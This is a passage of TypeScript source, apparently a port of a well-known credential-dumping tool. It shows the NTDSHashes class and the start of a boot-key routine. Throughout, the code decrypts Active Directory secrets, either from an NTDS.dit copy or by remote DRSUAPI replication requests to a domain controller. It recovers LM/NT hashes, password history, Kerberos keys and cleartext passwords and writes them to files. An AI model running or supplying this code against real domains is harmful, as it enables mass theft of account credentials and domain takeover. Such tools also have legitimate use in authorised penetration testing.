        this.PEK.push(Buffer.from(pek));
        LOG.info(`PEK # ${index} found and decrypted: ${pek.toString('hex')}`);
        curIndex++;
        pos += 20;
      }
    }
  }

  private removeRC4Layer(cryptedHash: any): Buffer {
    const pekIndexStr = (cryptedHash.get('Header') as Buffer).toString('hex');
    const pekIndex = parseInt(pekIndexStr.substring(8, 10), 16);
    const md5Hash = nodeCrypto.createHash('md5');
    md5Hash.update(this.PEK[pekIndex]!);
    md5Hash.update(cryptedHash.get('KeyMaterial') as Buffer);
    const tmpKey = md5Hash.digest();
    return rc4Encrypt(tmpKey, cryptedHash.get('EncryptedHash') as Buffer);
  }

  private removeDESLayerLocal(cryptedHash: Buffer, rid: number): Buffer {
    const [key1, key2] = this.cryptoCommon.deriveKey(rid);
    return Buffer.concat([
      desEcbDecryptBlock(key1, cryptedHash.subarray(0, 8)),
      desEcbDecryptBlock(key2, cryptedHash.subarray(8, 16)),
    ]);
  }

  private static fileTimeToDateTime(t: number): string {
    t -= 116444736000000000;
    t = Math.floor(t / 10000000);
    if (t < 0) return 'never';
    const dt = new Date(t * 1000);
    const y = dt.getFullYear();
    const m = String(dt.getMonth() + 1).padStart(2, '0');
    const d = String(dt.getDate()).padStart(2, '0');
    const hh = String(dt.getHours()).padStart(2, '0');
    const mm = String(dt.getMinutes()).padStart(2, '0');
    return `${y}-${m}-${d} ${hh}:${mm}`;
  }

  private decryptSupplementalInfo(
    record: any,
    prefixTable: any = null,
    keysFile: fs.WriteStream | null = null,
    clearTextFile: fs.WriteStream | null = null,
  ): void {
    let haveInfo = false;
    LOG.debug('Entering NTDSHashes.decryptSupplementalInfo');
    const NTI = NTDSHashes.NAME_TO_INTERNAL;
    let userName: string | null = null;
    let plainText: Buffer | null = null;

    if (this.useVSSMethod || this.remoteSSMethodWMINTDS) {
      if (record[NTI['supplementalCredentials']!] !== null && record[NTI['supplementalCredentials']!] !== undefined) {
        const raw = Buffer.from(record[NTI['supplementalCredentials']!] as string, 'hex');
        if (raw.length > 24) {
          if (record[NTI['userPrincipalName']!] !== null) {
            const domain = (record[NTI['userPrincipalName']!] as string).split('@').pop()!;
            userName = `${domain}\\${record[NTI['sAMAccountName']!]}`;
          } else {
            userName = record[NTI['sAMAccountName']!] as string;
          }

          const cipherText = new NTDSHashes.CRYPTED_BLOB();
          cipherText.fromString(raw);
          const blobHeader = cipherText.get('Header') as Buffer;

          if (blobHeader.subarray(0, 4).equals(Buffer.from([0x13, 0x00, 0x00, 0x00]))) {
            const pekIndexStr = blobHeader.toString('hex');
            const pekIndex = parseInt(pekIndexStr.substring(8, 10), 16);
            plainText = CryptoCommon.decryptAES(
              this.PEK[pekIndex]!,
              (cipherText.get('EncryptedHash') as Buffer).subarray(4),
              cipherText.get('KeyMaterial') as Buffer,
            );
            haveInfo = true;
          } else {
            plainText = this.removeRC4Layer(cipherText);
            haveInfo = true;
          }
        }
      }
    } else {
      let domain: string | null = null;
      const replyVersion = `V${record.get('pdwOutVersion')}`;
      const pmsgOutReply = (record.get('pmsgOut') as any).fields[replyVersion] as any;
      const pAttrs = (pmsgOutReply.get('pObjects') as any).get('Entinf').get('AttrBlock').get('pAttr') as any[];
      for (const attr of pAttrs) {
        let attId: any;
        let LOOKUP_TABLE: Record<string, any>;
        try {
          attId = oidFromAttid(prefixTable, attr.get('attrTyp'));
          LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID;
        } catch (e: unknown) {
          LOG.debug(`Failed to execute OidFromAttid with error ${e}`);
          attId = attr.get('attrTyp');
          LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP;
        }

        if (attId === LOOKUP_TABLE['userPrincipalName']) {
          const attrVal = attr.get('AttrVal') as any;
          if ((attrVal.get('valCount') as number) > 0) {
            try {
              domain = Buffer.concat((attrVal.get('pAVal') as any[])[0].get('pVal'))
                .toString('utf16le')
                .split('@')
                .pop()!;
            } catch {
              domain = null;
            }
          }
        } else if (attId === LOOKUP_TABLE['sAMAccountName']) {
          const attrVal = attr.get('AttrVal') as any;
          if ((attrVal.get('valCount') as number) > 0) {
            try {
              userName = Buffer.concat((attrVal.get('pAVal') as any[])[0].get('pVal')).toString('utf16le');
            } catch {
              LOG.error(
                `Cannot get sAMAccountName for ${String(pmsgOutReply.get('pNC').get('StringName')).slice(0, -1)}`,
              );
              userName = 'unknown';
            }
          } else {
            userName = 'unknown';
          }
        }

        if (attId === LOOKUP_TABLE['supplementalCredentials']) {
          const attrVal = attr.get('AttrVal') as any;
          if ((attrVal.get('valCount') as number) > 0) {
            const blob = Buffer.concat((attrVal.get('pAVal') as any[])[0].get('pVal'));
            plainText = decryptAttributeValue(this.remoteOps!.getDrsr()!, blob);
            if (plainText.length > 24) {
              haveInfo = true;
            }
          }
        }
      }
      if (domain !== null && userName !== null) {
        userName = `${domain}\\${userName}`;
      }
    }

    if (haveInfo && plainText) {
      try {
        const userProperties = new USER_PROPERTIES();
        userProperties.fromString(plainText);

        let propertiesData: Buffer = userProperties.get('UserProperties') as Buffer;
        const propCount = Number(userProperties.get('PropertyCount'));

        for (let p = 0; p < propCount; p++) {
          const userProperty = new USER_PROPERTY();
          userProperty.fromString(propertiesData);
          propertiesData = propertiesData.subarray(userProperty.getData().length);

          const propName = (userProperty.get('PropertyName') as Buffer).toString('utf16le');

          if (propName === 'Primary:Kerberos-Newer-Keys') {
            const propertyValueBuffer = Buffer.from(
              (userProperty.get('PropertyValue') as Buffer).toString('ascii'),
              'hex',
            );
            const kerbStoredCredentialNew = new KERB_STORED_CREDENTIAL_NEW();
            kerbStoredCredentialNew.fromString(propertyValueBuffer);
            let data: Buffer = kerbStoredCredentialNew.get('Buffer') as Buffer;
            const credCount = Number(kerbStoredCredentialNew.get('CredentialCount'));

            for (let c = 0; c < credCount; c++) {
              const keyDataNew = new KERB_KEY_DATA_NEW();
              keyDataNew.fromString(data);
              data = data.subarray(keyDataNew.getData().length);
              const keyOffset = Number(keyDataNew.get('KeyOffset'));
              const keyLength = Number(keyDataNew.get('KeyLength'));
              const keyValue = propertyValueBuffer.subarray(keyOffset, keyOffset + keyLength);
              const keyType = Number(keyDataNew.get('KeyType'));

              let answer: string;
              const typeName = NTDSHashes.KERBEROS_TYPE[keyType];
              if (typeName) {
                answer = `${userName}:${typeName}:${keyValue.toString('hex')}`;
              } else {
                answer = `${userName}:0x${keyType.toString(16)}:${keyValue.toString('hex')}`;
              }

              this.kerberosKeys.set(answer, null);
              if (keysFile !== null) {
                NTDSHashes.writeOutput(keysFile, answer + '\n');
              }
            }
          } else if (propName === 'Primary:CLEARTEXT') {
            const propVal = (userProperty.get('PropertyValue') as Buffer).toString('ascii');
            let answer: string;
            try {
              const decoded = Buffer.from(propVal, 'hex').toString('utf16le');
              answer = `${userName}:CLEARTEXT:${decoded}`;
            } catch {
              answer = `${userName}:CLEARTEXT:0x${propVal}`;
            }
            this.clearTextPwds.set(answer, null);
            if (clearTextFile !== null) {
              NTDSHashes.writeOutput(clearTextFile, answer + '\n');
            }
          }
        }
      } catch {
        // Discard unparseable properties
        return;
      }

      if (clearTextFile !== null) {
        // flush is automatic with streams
      }
      if (keysFile !== null) {
        // flush is automatic with streams
      }
    }

    LOG.debug('Leaving NTDSHashes.decryptSupplementalInfo');
  }

  private decryptNTDSHash(
    record: any,
    prefixTable: any = null,
    outputFile: fs.WriteStream | null = null,
    fallbackUserName: string | null = null,
  ): void {
    LOG.debug('Entering NTDSHashes.decryptHash');
    const NTI = NTDSHashes.NAME_TO_INTERNAL;

    if (this.useVSSMethod || this.remoteSSMethodWMINTDS) {
      LOG.debug(`Decrypting hash for user: ${record[NTI['name']!]}`);

      const sid = new SAMR_RPC_SID();
      sid.fromString(Buffer.from(record[NTI['objectSid']!] as string, 'hex'));
      const rid = sid.formatCanonical().split('-').pop()!;
      const ridNum = parseInt(rid, 10);

      let LMHash: Buffer;
      if (record[NTI['dBCSPwd']!] !== null && record[NTI['dBCSPwd']!] !== undefined) {
        const rawLM = Buffer.from(record[NTI['dBCSPwd']!] as string, 'hex');
        let encryptedLMHash = new NTDSHashes.CRYPTED_HASH();
        encryptedLMHash.fromString(rawLM);
        const lmHeader = encryptedLMHash.get('Header') as Buffer;

        if (lmHeader.subarray(0, 4).equals(Buffer.from([0x13, 0x00, 0x00, 0x00]))) {
          const encLMW16 = new NTDSHashes.CRYPTED_HASHW16();
          encLMW16.fromString(rawLM);
          const pekIndexStr = (encLMW16.get('Header') as Buffer).toString('hex');
          const pekIndex = parseInt(pekIndexStr.substring(8, 10), 16);
          const tmpLMHash = CryptoCommon.decryptAES(
            this.PEK[pekIndex]!,
            (encLMW16.get('EncryptedHash') as Buffer).subarray(0, 16),
            encLMW16.get('KeyMaterial') as Buffer,
          );
          LMHash = this.removeDESLayerLocal(tmpLMHash, ridNum);
        } else {
          const tmpLMHash = this.removeRC4Layer(encryptedLMHash);
          LMHash = this.removeDESLayerLocal(tmpLMHash, ridNum);
        }
      } else {
        LMHash = Buffer.from(lmowfV1('', ''));
      }

      let NTHash: Buffer;
      if (record[NTI['unicodePwd']!] !== null && record[NTI['unicodePwd']!] !== undefined) {
        const rawNT = Buffer.from(record[NTI['unicodePwd']!] as string, 'hex');
        let encryptedNTHash = new NTDSHashes.CRYPTED_HASH();
        encryptedNTHash.fromString(rawNT);
        const ntHeader = encryptedNTHash.get('Header') as Buffer;

        if (ntHeader.subarray(0, 4).equals(Buffer.from([0x13, 0x00, 0x00, 0x00]))) {
          const encNTW16 = new NTDSHashes.CRYPTED_HASHW16();
          encNTW16.fromString(rawNT);
          const pekIndexStr = (encNTW16.get('Header') as Buffer).toString('hex');
          const pekIndex = parseInt(pekIndexStr.substring(8, 10), 16);
          const tmpNTHash = CryptoCommon.decryptAES(
            this.PEK[pekIndex]!,
            (encNTW16.get('EncryptedHash') as Buffer).subarray(0, 16),
            encNTW16.get('KeyMaterial') as Buffer,
          );
          NTHash = this.removeDESLayerLocal(tmpNTHash, ridNum);
        } else {
          const tmpNTHash = this.removeRC4Layer(encryptedNTHash);
          NTHash = this.removeDESLayerLocal(tmpNTHash, ridNum);
        }
      } else {
        NTHash = Buffer.from(ntowfV1('', ''));
      }

      let userName: string;
      if (record[NTI['userPrincipalName']!] !== null && record[NTI['userPrincipalName']!] !== undefined) {
        const domain = (record[NTI['userPrincipalName']!] as string).split('@').pop()!;
        userName = `${domain}\\${record[NTI['sAMAccountName']!]}`;
      } else {
        userName = record[NTI['sAMAccountName']!] as string;
      }

      let userAccountStatus = 'N/A';
      if (this.printUserStatus) {
        if (record[NTI['userAccountControl']!] !== null && record[NTI['userAccountControl']!] !== undefined) {
          const uac = Number(record[NTI['userAccountControl']!]);
          userAccountStatus = (uac & 0x02) !== 0 ? 'Disabled' : 'Enabled';
        }
      }

      let pwdLastSetStr = 'N/A';
      if (record[NTI['pwdLastSet']!] !== null && record[NTI['pwdLastSet']!] !== undefined) {
        pwdLastSetStr = NTDSHashes.fileTimeToDateTime(Number(record[NTI['pwdLastSet']!]));
      }

      let answer = `${userName}:${rid}:${LMHash.toString('hex')}:${NTHash.toString('hex')}:::`;
      if (this.pwdLastSet) {
        answer = `${answer} (pwdLastSet=${pwdLastSetStr})`;
      }
      if (this.printUserStatus) {
        answer = `${answer} (status=${userAccountStatus})`;
      }

      this.perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer);
      if (outputFile !== null) {
        NTDSHashes.writeOutput(outputFile, answer + '\n');
      }

      if (this._history) {
        const LMHistory: Buffer[] = [];
        const NTHistory: Buffer[] = [];

        if (record[NTI['lmPwdHistory']!] !== null && record[NTI['lmPwdHistory']!] !== undefined) {
          const encryptedLMHistory = new NTDSHashes.CRYPTED_HISTORY();
          encryptedLMHistory.fromString(Buffer.from(record[NTI['lmPwdHistory']!] as string, 'hex'));
          const tmpLMHistory = this.removeRC4Layer(encryptedLMHistory);
          for (let i = 0; i < Math.floor(tmpLMHistory.length / 16); i++) {
            LMHistory.push(this.removeDESLayerLocal(tmpLMHistory.subarray(i * 16, (i + 1) * 16), ridNum));
          }
        }

        if (record[NTI['ntPwdHistory']!] !== null && record[NTI['ntPwdHistory']!] !== undefined) {
          const rawNTHistory = Buffer.from(record[NTI['ntPwdHistory']!] as string, 'hex');
          const encryptedNTHistory = new NTDSHashes.CRYPTED_HISTORY();
          encryptedNTHistory.fromString(rawNTHistory);
          const ntHistHeader = encryptedNTHistory.get('Header') as Buffer;

          let tmpNTHistory: Buffer;
          if (ntHistHeader.subarray(0, 4).equals(Buffer.from([0x13, 0x00, 0x00, 0x00]))) {
            const encNTHistW16 = new NTDSHashes.CRYPTED_HASHW16();
            encNTHistW16.fromString(rawNTHistory);
            const pekIndexStr = (encNTHistW16.get('Header') as Buffer).toString('hex');
            const pekIndex = parseInt(pekIndexStr.substring(8, 10), 16);
            tmpNTHistory = CryptoCommon.decryptAES(
              this.PEK[pekIndex]!,
              encNTHistW16.get('EncryptedHash') as Buffer,
              encNTHistW16.get('KeyMaterial') as Buffer,
            );
          } else {
            tmpNTHistory = this.removeRC4Layer(encryptedNTHistory);
          }

          for (let i = 0; i < Math.floor(tmpNTHistory.length / 16); i++) {
            NTHistory.push(this.removeDESLayerLocal(tmpNTHistory.subarray(i * 16, (i + 1) * 16), ridNum));
          }
        }

        const maxHistory = Math.max(LMHistory.length - 1, NTHistory.length - 1);
        for (let i = 0; i < maxHistory; i++) {
          const lmhash = this.noLMHash
            ? Buffer.from(lmowfV1('', '')).toString('hex')
            : (LMHistory[i + 1] ?? Buffer.from(lmowfV1('', ''))).toString('hex');
          const nthash = (NTHistory[i + 1] ?? Buffer.from(ntowfV1('', ''))).toString('hex');
          const histAnswer = `${userName}_history${i}:${rid}:${lmhash}:${nthash}:::`;
          if (outputFile !== null) {
            NTDSHashes.writeOutput(outputFile, histAnswer + '\n');
          }
          this.perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, histAnswer);
        }
      }
    } else {
      // DRSUAPI method
      const replyVersion = `V${record.get('pdwOutVersion')}`;
      const pmsgOutReply = (record.get('pmsgOut') as any).fields[replyVersion] as any;
      LOG.debug(
        `Decrypting hash for user: ${String(pmsgOutReply.get('pNC').get('StringName')).slice(0, -1)}`,
      );

      let domain: string | null = null;
      let userName = 'unknown';
      let LMHash: Buffer = Buffer.from(lmowfV1('', ''));
      let NTHash: Buffer = Buffer.from(ntowfV1('', ''));
      let userAccountStatus = 'N/A';
      let pwdLastSetStr = 'N/A';
      const LMHistory: Buffer[] = [];
      const NTHistory: Buffer[] = [];

      const ridBuf = (pmsgOutReply.get('pObjects') as any).get('Entinf').get('pName').get('Sid') as Buffer;
      const rid = ridBuf.readUInt32LE(ridBuf.length - 4);

      const pAttrs = (pmsgOutReply.get('pObjects') as any).get('Entinf').get('AttrBlock').get('pAttr') as any[];
      for (const attr of pAttrs) {
        let attId: any;
        let LOOKUP_TABLE: Record<string, any>;
        try {
          attId = oidFromAttid(prefixTable, attr.get('attrTyp'));
          LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID;
        } catch (e: unknown) {
          LOG.debug(`Failed to execute OidFromAttid with error ${e}, fallbacking to fixed table`);
          attId = attr.get('attrTyp');
          LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP;
        }

        const attrVal = attr.get('AttrVal') as any;
        const valCount = attrVal.get('valCount') as number;
        const getAttrBuf = (): Buffer => Buffer.concat((attrVal.get('pAVal') as any[])[0].get('pVal'));

        if (attId === LOOKUP_TABLE['dBCSPwd']) {
          if (valCount > 0) {
            const encryptedLMHash = decryptAttributeValue(this.remoteOps!.getDrsr()!, getAttrBuf());
            LMHash = removeDESLayer(encryptedLMHash, rid);
          }
        } else if (attId === LOOKUP_TABLE['unicodePwd']) {
          if (valCount > 0) {
            const encryptedNTHash = decryptAttributeValue(this.remoteOps!.getDrsr()!, getAttrBuf());
            NTHash = removeDESLayer(encryptedNTHash, rid);
          }
        } else if (attId === LOOKUP_TABLE['userPrincipalName']) {
          if (valCount > 0) {
            try {
              domain = getAttrBuf().toString('utf16le').split('@').pop()!;
            } catch {
              domain = null;
            }
          }
        } else if (attId === LOOKUP_TABLE['sAMAccountName']) {
          if (valCount > 0) {
            try {
              userName = getAttrBuf().toString('utf16le');
            } catch {
              userName = 'unknown';
            }
          }
        } else if (attId === LOOKUP_TABLE['pwdLastSet']) {
          if (valCount > 0) {
            try {
              const val = getAttrBuf();
              const bigVal = val.readBigUInt64LE(0);
              pwdLastSetStr = NTDSHashes.fileTimeToDateTime(Number(bigVal));
            } catch {
              pwdLastSetStr = 'N/A';
            }
          }
        } else if (this.printUserStatus && attId === LOOKUP_TABLE['userAccountControl']) {
          if (valCount > 0) {
            const uac = getAttrBuf().readUInt32LE(0);
            userAccountStatus = (uac & UF_ACCOUNTDISABLE) !== 0 ? 'Disabled' : 'Enabled';
          }
        }

        if (this._history) {
          if (attId === LOOKUP_TABLE['lmPwdHistory']) {
            if (valCount > 0) {
              const tmpLMHistory = decryptAttributeValue(this.remoteOps!.getDrsr()!, getAttrBuf());
              for (let i = 0; i < Math.floor(tmpLMHistory.length / 16); i++) {
                LMHistory.push(removeDESLayer(tmpLMHistory.subarray(i * 16, (i + 1) * 16), rid));
              }
            }
          } else if (attId === LOOKUP_TABLE['ntPwdHistory']) {
            if (valCount > 0) {
              const tmpNTHistory = decryptAttributeValue(this.remoteOps!.getDrsr()!, getAttrBuf());
              for (let i = 0; i < Math.floor(tmpNTHistory.length / 16); i++) {
                NTHistory.push(removeDESLayer(tmpNTHistory.subarray(i * 16, (i + 1) * 16), rid));
              }
            }
          }
        }
      }

      if (userName === 'unknown' && fallbackUserName !== null && fallbackUserName !== '') {
        // sAMAccountName wasn't present in the DRS reply (e.g. -just-dc-user).
        // Fall back to the name the caller already resolved from the CLI.
        userName = fallbackUserName;
      }

      if (domain !== null) {
        userName = `${domain}\\${userName}`;
      }

      let answer = `${userName}:${rid}:${LMHash.toString('hex')}:${NTHash.toString('hex')}:::`;
      if (this.pwdLastSet) {
        answer = `${answer} (pwdLastSet=${pwdLastSetStr})`;
      }
      if (this.printUserStatus) {
        answer = `${answer} (status=${userAccountStatus})`;
      }

      this.perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, answer);
      if (outputFile !== null) {
        NTDSHashes.writeOutput(outputFile, answer + '\n');
      }

      if (this._history) {
        const maxHistory = Math.max(LMHistory.length - 1, NTHistory.length - 1);
        for (let i = 0; i < maxHistory; i++) {
          const lmhash = this.noLMHash
            ? Buffer.from(lmowfV1('', '')).toString('hex')
            : (LMHistory[i + 1] ?? Buffer.from(lmowfV1('', ''))).toString('hex');
          const nthash = (NTHistory[i + 1] ?? Buffer.from(ntowfV1('', ''))).toString('hex');
          const histAnswer = `${userName}_history${i}:${rid}:${lmhash}:${nthash}:::`;
          this.perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS, histAnswer);
          if (outputFile !== null) {
            NTDSHashes.writeOutput(outputFile, histAnswer + '\n');
          }
        }
      }
    }

    if (outputFile !== null) {
      // WriteStream auto-flushes
    }
    LOG.debug('Leaving NTDSHashes.decryptHash');
  }

  async dump(): Promise<void> {
    let hashesOutputFile: fs.WriteStream | null = null;
    let keysOutputFile: fs.WriteStream | null = null;
    let clearTextOutputFile: fs.WriteStream | null = null;
    let skipUsers: string[] = [];

    if (this.skipUser) {
      if (fs.existsSync(this.skipUser)) {
        skipUsers = fs
          .readFileSync(this.skipUser, 'utf-8')
          .split('\n')
          .map((l) => l.trim())
          .filter((l) => l.length > 0);
      } else {
        skipUsers = this.skipUser.split(',');
      }
    }

    if (this.useVSSMethod || this.remoteSSMethodWMINTDS) {
      if (this.ntds === null) return;
    } else {
      if (this.ntds === null) {
        try {
          if (this.remoteOps !== null) {
            try {
              const [, domain] = await this.remoteOps.getMachineNameAndDomain();
              await this.remoteOps.connectSamr(domain);
            } catch {
              if (this.justUser !== null || this.ldapFilter !== null) {
                // SAMR not needed — DRSCrackNames resolves usernames via DRSUAPI
              } else if (process.env['KRB5CCNAME']) {
                // Last resort with cached tickets
              } else {
                throw new Error('connectSamr failed');
              }
            }
          } else {
            throw new Error('No remote Operations available');
          }
        } catch (e: unknown) {
          LOG.debug(`Exiting NTDSHashes.dump() because ${e}`);
          return;
        }
      }
    }

    try {
      if (this.outputFileName !== null) {
        LOG.debug(`Saving output to ${this.outputFileName}`);
        const mode = this.resumeSession.hasResumeData() ? 'a+' : 'w+';
        hashesOutputFile = openFile(`${this.outputFileName}.ntds`, mode);
        if (!this.justNTLM) {
          keysOutputFile = openFile(`${this.outputFileName}.ntds.kerberos`, mode);
          clearTextOutputFile = openFile(`${this.outputFileName}.ntds.cleartext`, mode);
        }
      }

      LOG.info('Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)');

      if (this.useVSSMethod || this.remoteSSMethodWMINTDS) {
        this.getPek();
        if (this.PEK.length > 0) {
          LOG.info(`Reading and decrypting hashes from ${this.ntds}`);

          for (const record of this.tmpUsers) {
            try {
              this.decryptNTDSHash(record, null, hashesOutputFile);
              if (!this.justNTLM) {
                this.decryptSupplementalInfo(record, null, keysOutputFile, clearTextOutputFile);
              }
            } catch (e: unknown) {
              try {
                LOG.error(
                  `Error while processing row for user ${record[NTDSHashes.NAME_TO_INTERNAL['name']!]}`,
                );
              } catch {
                LOG.error('Error while processing row!');
              }
              LOG.error(String(e));
            }
          }

          const NTI = NTDSHashes.NAME_TO_INTERNAL;
          while (true) {
            let record: any;
            try {
              record = this.eseDB!.getNextRow(this.cursor, this.filterTablesUsersecret);
            } catch {
              LOG.error('Error while calling getNextRow(), trying the next one');
              continue;
            }

            if (record === null) break;
            try {
              if (
                NTDSHashes.ACCOUNT_TYPES.includes(record[NTI['sAMAccountType']!]) &&
                (record[NTI['instanceType']!] & 4) !== 0
              ) {
                this.decryptNTDSHash(record, null, hashesOutputFile);
                if (!this.justNTLM) {
                  this.decryptSupplementalInfo(record, null, keysOutputFile, clearTextOutputFile);
                }
              }
            } catch (e: unknown) {
              try {
                LOG.error(`Error while processing row for user ${record[NTI['name']!]}`);
              } catch {
                LOG.error('Error while processing row!');
              }
              LOG.error(String(e));
            }
          }
        }
      } else {
        // DRSUAPI method
        LOG.info('Using the DRSUAPI method to get NTDS.DIT secrets');
        let status: number = STATUS_MORE_ENTRIES;
        let enumerationContext = 0;
        let lookupBySid = true;

        let resumeSid: string | null = null;
        if (this.resumeSession.hasResumeData()) {
          resumeSid = this.resumeSession.getResumeData();
          LOG.info(`Resuming from SID ${resumeSid}, be patient`);
        } else {
          if (this.justUser === null && this.ldapFilter === null) {
            this.resumeSession.beginTransaction();
          }
        }

        if (this.justUser !== null) {
          let formatOffered: number;
          let justUser = this.justUser;
          if (justUser.includes('\\') || justUser.includes('/')) {
            justUser = justUser.replace(/\//g, '\\');
            formatOffered = DS_NAME_FORMAT.enumValues['DS_NT4_ACCOUNT_NAME']!;
          } else {
            formatOffered = 0xfffffff9; // DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
          }

          const crackedName = await this.remoteOps!.DRSCrackNames(
            formatOffered,
            DS_NAME_FORMAT.enumValues['DS_UNIQUE_ID_NAME']!,
            justUser,
          );

          const cnResult = (crackedName.get('pmsgOut') as any).fields['V1'].get('pResult') as any;
          const cnItems = cnResult.get('cItems') as number;
          if (cnItems === 1) {
            const rItem0 = (cnResult.get('rItems') as any[])[0];
            if (rItem0.get('status') !== 0) {
              const errCode = 0x2114 + (rItem0.get('status') as number);
              const errMsg = ERROR_MESSAGES[errCode];
              throw new Error(`${errMsg?.[0] ?? 'Unknown'}: ${errMsg?.[1] ?? ''}`);
            }

            const userRecord = await this.remoteOps!.DRSGetNCChangesGuid(
              String(rItem0.get('pName')).slice(0, -1),
            );
            const replyVersion = `V${userRecord.get('pdwOutVersion')}`;
            const urReply = (userRecord.get('pmsgOut') as any).fields[replyVersion] as any;
            if (urReply.get('cNumObjects') === 0) {
              throw new Error("DRSGetNCChanges didn't return any object!");
            }

            try {
              // justUser may be "DOMAIN\\user" — pass only the account name as fallback
              const fallbackName = justUser.split('\\').pop() ?? justUser;
              this.decryptNTDSHash(
                userRecord,
                urReply.get('PrefixTableSrc').get('pPrefixEntry'),
                hashesOutputFile,
                fallbackName,
              );
              if (!this.justNTLM) {
                this.decryptSupplementalInfo(
                  userRecord,
                  urReply.get('PrefixTableSrc').get('pPrefixEntry'),
                  keysOutputFile,
                  clearTextOutputFile,
                );
              }
            } catch (e: unknown) {
              LOG.error('Error while processing user!');
              LOG.error(String(e));
            }
          } else {
            LOG.warning(
              `DRSCrackNames returned ${cnItems} items for user ${justUser}, skipping`,
            );
          }
        } else if (this.ldapFilter !== null) {
          // LDAP filter mode - not implemented in this port as ldap module is not available
          LOG.warning('LDAP filter mode not yet implemented in TypeScript port');
        } else {
          while (status === STATUS_MORE_ENTRIES) {
            const resp = await this.remoteOps!.getDomainUsers(enumerationContext);

            const respBuf = (resp.get('Buffer') as any).get('Buffer') as any[];
            for (const user of respBuf) {
              const userName: string = user.get('Name') as string;
              if (skipUsers.includes(userName)) continue;
              const userSid = `${this.remoteOps!.getDomainSid()}-${user.get('RelativeId')}`;

              if (resumeSid !== null) {
                if (resumeSid === userSid) {
                  LOG.debug(`resumeSid ${userSid} reached! processing users from now on`);
                  resumeSid = null;
                } else {
                  LOG.debug(`Skipping SID ${userSid} since it was processed already`);
                }
                continue;
              }

              let userRecord: any;
              if (lookupBySid) {
                try {
                  userRecord = await this.remoteOps!.DRSGetNCChangesSid(userSid);
                } catch (e: unknown) {
                  if (e instanceof DCERPCException) {
                    LOG.debug(
                      'SID lookup unsuccessful, falling back to DRSCrackNames/GUID lookups',
                    );
                    lookupBySid = false;
                  } else {
                    throw e;
                  }
                }
              }

              if (!lookupBySid) {
                const crackedName = await this.remoteOps!.DRSCrackNames(
                  DS_NAME_FORMAT.enumValues['DS_SID_OR_SID_HISTORY_NAME']!,
                  DS_NAME_FORMAT.enumValues['DS_UNIQUE_ID_NAME']!,
                  userSid,
                );

                const cn2Result = (crackedName.get('pmsgOut') as any).fields['V1'].get('pResult') as any;
                const cn2Items = cn2Result.get('cItems') as number;
                if (cn2Items === 1) {
                  const rItem0 = (cn2Result.get('rItems') as any[])[0];
                  if (rItem0.get('status') !== 0) {
                    const errCode = 0x2114 + (rItem0.get('status') as number);
                    const errMsg = ERROR_MESSAGES[errCode];
                    LOG.error(`${errMsg?.[0] ?? 'Unknown'}: ${errMsg?.[1] ?? ''}`);
                    break;
                  }
                  userRecord = await this.remoteOps!.DRSGetNCChangesGuid(
                    String(rItem0.get('pName')).slice(0, -1),
                  );
                } else {
                  LOG.warning(
                    `DRSCrackNames returned ${cn2Items} items for user ${userName}, skipping`,
                  );
                  continue;
                }
              }

              const replyVersion = `V${userRecord.get('pdwOutVersion')}`;
              const urReply2 = (userRecord.get('pmsgOut') as any).fields[replyVersion] as any;
              if (urReply2.get('cNumObjects') === 0) {
                throw new Error("DRSGetNCChanges didn't return any object!");
              }

              try {
                this.decryptNTDSHash(
                  userRecord,
                  urReply2.get('PrefixTableSrc').get('pPrefixEntry'),
                  hashesOutputFile,
                  typeof userName === 'string' ? userName : null,
                );
                if (!this.justNTLM) {
                  this.decryptSupplementalInfo(
                    userRecord,
                    urReply2.get('PrefixTableSrc').get('pPrefixEntry'),
                    keysOutputFile,
                    clearTextOutputFile,
                  );
                }
              } catch (e: unknown) {
                LOG.error('Error while processing user!');
                LOG.error(String(e));
              }

              this.resumeSession.writeResumeData(userSid);
            }

            enumerationContext = resp.get('EnumerationContext');
            status = resp.get('ErrorCode') as number;
          }

          if (this.justUser === null && this.ldapFilter === null) {
            this.resumeSession.clearResumeData();
          }
        }

        LOG.debug("Finished processing and printing user's hashes, now printing supplemental information");

        if (this.kerberosKeys.size > 0) {
          if (this.useVSSMethod || this.remoteSSMethodWMINTDS) {
            LOG.info(`Kerberos keys from ${this.ntds}`);
          } else {
            LOG.info('Kerberos keys grabbed');
          }
          for (const itemKey of this.kerberosKeys.keys()) {
            this.perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS_KERBEROS, itemKey);
          }
        }

        if (this.clearTextPwds.size > 0) {
          if (this.useVSSMethod || this.remoteSSMethodWMINTDS) {
            LOG.info(`ClearText password from ${this.ntds}`);
          } else {
            LOG.info('ClearText passwords grabbed');
          }
          for (const itemKey of this.clearTextPwds.keys()) {
            this.perSecretCallback(NTDSHashes.SECRET_TYPE.NTDS_CLEARTEXT, itemKey);
          }
        }
      }
    } finally {
      if (hashesOutputFile !== null) hashesOutputFile.end();
      if (keysOutputFile !== null) keysOutputFile.end();
      if (clearTextOutputFile !== null) clearTextOutputFile.end();
      this.resumeSession.endTransaction();
    }
  }

  private static writeOutput(fd: fs.WriteStream, data: string): void {
    try {
      fd.write(data);
    } catch (e: unknown) {
      LOG.error(`Error writing entry, skipping (${e})`);
    }
  }

  finish(): void {
    if (this.ntds !== null && this.eseDB !== null) {
      this.eseDB.close();
    }
  }
}

// ---------------------------------------------------------------------------
// LocalOperations
// ---------------------------------------------------------------------------

export class LocalOperations {
  private systemHive: string;

  constructor(systemHive: string) {
    this.systemHive = systemHive;
  }

  getBootKey(): Buffer {
    let bootKey = Buffer.alloc(0);
    let tmpKey = Buffer.alloc(0);
    const winreg = getRegistryParser(this.systemHive, false);

    const currentControlSetVal = winreg.getValue('\\Select\\Current')!;
    const currentControlSet = `ControlSet${String(currentControlSetVal[1]).padStart(3, '0')}`;

    for (const key of ['JD', 'Skew1', 'GBG', 'Data']) {
      LOG.debug(`Retrieving class info for ${key}`);
      const ans = winreg.getClass(`\\${currentControlSet}\\Control\\Lsa\\${key}`)!;
      const digit = ans.subarray(0, 16).toString('utf16le');
